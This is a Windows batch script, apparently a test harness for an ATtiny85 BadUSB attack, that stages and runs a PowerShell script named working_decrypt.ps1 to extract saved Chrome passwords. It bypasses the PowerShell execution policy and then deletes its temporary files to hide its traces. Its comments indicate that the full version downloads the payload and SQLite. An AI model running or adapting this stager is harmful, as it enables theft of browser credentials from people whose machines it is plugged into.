@echo off
echo ========================================
echo ATtiny85 Chrome Password Extraction Test
echo ========================================

:: Step 1: Create a temporary directory
set tempDir=%temp%\attiny_chrome_scripts
if not exist %tempDir% mkdir %tempDir%
echo Created temporary directory: %tempDir%

:: Step 2: Copy local script for testing (instead of downloading)
echo Copying Chrome password script...
copy "%~dp0working_decrypt.ps1" "%tempDir%\working_decrypt.ps1"

:: Step 3: Skip SQLite download for this test (not needed for working_decrypt.ps1)
echo Skipping SQLite download (not required for this test)

:: Step 4: Change directory to the temporary folder
cd /d %tempDir%
echo Changed to directory: %tempDir%

:: Step 5: Execute the PowerShell script
echo Executing Chrome password analysis script...
echo ----------------------------------------
powershell -ExecutionPolicy Bypass -File working_decrypt.ps1
echo ----------------------------------------

:: Step 6: Clean up - Delete all downloaded files and temporary directory
echo Cleaning up temporary files...
cd /d %temp%
rd /s /q %tempDir%

:: Step 7: Exit
echo ========================================
echo ATtiny85 simulation completed successfully!
echo ========================================
pause
exit
